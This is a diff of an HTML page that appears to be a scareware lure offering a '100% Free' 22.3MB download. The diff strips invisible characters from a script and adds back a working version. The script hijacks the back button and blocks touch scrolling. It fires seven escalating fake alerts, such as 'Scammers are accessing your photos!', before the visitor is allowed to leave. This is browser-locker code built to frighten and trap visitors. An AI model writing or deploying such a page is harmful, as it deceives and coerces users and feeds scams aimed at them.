@@ -55,6 +55,11 @@
       color: #aaaaaa;
       margin-top: 15px;
     }
+
+    /* Hidden countdown element */
+    #exitAttempts {
+      display: none;
+    }
   </style>
 </head>
 <body>
@@ -76,71 +81,68 @@
     <div class="disclaimer">
       100% Free • Fast & Secure Connection • Only 22.3MB
     </div>
+
+    <!-- Hidden countdown warning text -->
+    <div id="exitAttempts" style="display: none;"></div>
   </div>
 
-<script>
-‎        let attempts = 0;
-‎        const maxAttempts = 7;
-‎        const cancelBtn = document.getElementById('cancelBtn');
-‎        const exitAttemptsText = document.getElementById('exitAttempts');
-‎        
-‎        // Disable back button
-‎        history.pushState(null, null, location.href);
-‎        window.onpopstate = function(event) {
-‎            history.go(1);
-‎            handleExitAttempt();
-‎        };
-‎        
-‎        // Handle exit attempts
-‎        function handleExitAttempt() {
-‎            attempts++;
-‎            exitAttemptsText.textContent = `Warning: ${attempts}/${maxAttempts} attempts to exit`;
-‎            
-‎            if (attempts < maxAttempts) {
-‎                // Show increasingly urgent warnings
-‎                const warnings = [
-‎                    "Your data is still at risk!",
-‎                    "Scammers are accessing your photos!",
-‎                    "Bank accounts is visible!",
-‎                    "Last chance to protect yourself!",
-‎                    "Security breach detected!",
-‎                    "Critical danger!",
-‎                    "Final warning!"
-‎                ];
-‎                
-‎                alert(`⚠️ ${warnings[attempts-1]}`);
-‎                
-‎                // Make the alert box shake
-‎                const alertBox = document.querySelector('.alert-box');
-‎                alertBox.style.animation = 'none';
-‎                alertBox.offsetHeight; // Trigger reflow
-‎                alertBox.style.animation = 'shake 0.5s, pulse 1.5s infinite';
-‎                
-‎                // Add shake animation
-‎                const style = document.createElement('style');
-‎                style.textContent = `
-‎                    @keyframes shake {
-‎                        0%, 100% { transform: translateX(0); }
-‎                        20% { transform: translateX(-10px); }
-‎                        40% { transform: translateX(10px); }
-‎                        60% { transform: translateX(-10px); }
-‎                        80% { transform: translateX(10px); }
-‎                    }
-‎                `;
-‎                document.head.appendChild(style);
-‎            } else {
-‎                // After 7 attempts, allow exit
-‎                window.location.href = "about:blank";
-‎            }
-‎        }
-‎        
-‎        // Cancel button also counts as attempt
-‎        cancelBtn.addEventListener('click', handleExitAttempt);
-‎        
-‎        // Prevent touch scrolling
-‎        document.addEventListener('touchmove', function(e) {
-‎            e.preventDefault();
-‎        }, { passive: false });
-‎    </script>
-‎</body>
-‎</html>
+  <script>
+    let attempts = 0;
+    const maxAttempts = 7;
+    const exitAttemptsText = document.getElementById('exitAttempts');
+
+    // Disable back button
+    history.pushState(null, null, location.href);
+    window.onpopstate = function(event) {
+      history.go(1);
+      handleExitAttempt();
+    };
+
+    // Handle exit attempts
+    function handleExitAttempt() {
+      attempts++;
+      exitAttemptsText.textContent = `Warning: ${attempts}/${maxAttempts} attempts to exit`;
+
+      if (attempts < maxAttempts) {
+        const warnings = [
+          "Your data is still at risk!",
+          "Scammers are accessing your photos!",
+          "Bank accounts is visible!",
+          "Last chance to protect yourself!",
+          "Security breach detected!",
+          "Critical danger!",
+          "Final warning!"
+        ];
+
+        alert(`⚠️ ${warnings[attempts - 1]}`);
+
+        const alertBox = document.querySelector('.alert-box');
+        if (alertBox) {
+          alertBox.style.animation = 'none';
+          alertBox.offsetHeight;
+          alertBox.style.animation = 'shake 0.5s, pulse 1.5s infinite';
+        }
+
+        const style = document.createElement('style');
+        style.textContent = `
+          @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-10px); }
+            40% { transform: translateX(10px); }
+            60% { transform: translateX(-10px); }
+            80% { transform: translateX(10px); }
+          }
+        `;
+        document.head.appendChild(style);
+      } else {
+        window.location.href = "about:blank";
+      }
+    }
+
+    // Prevent touch scrolling
+    document.addEventListener('touchmove', function(e) {
+      e.preventDefault();
+    }, { passive: false });
+  </script>
+</body>
+</html>
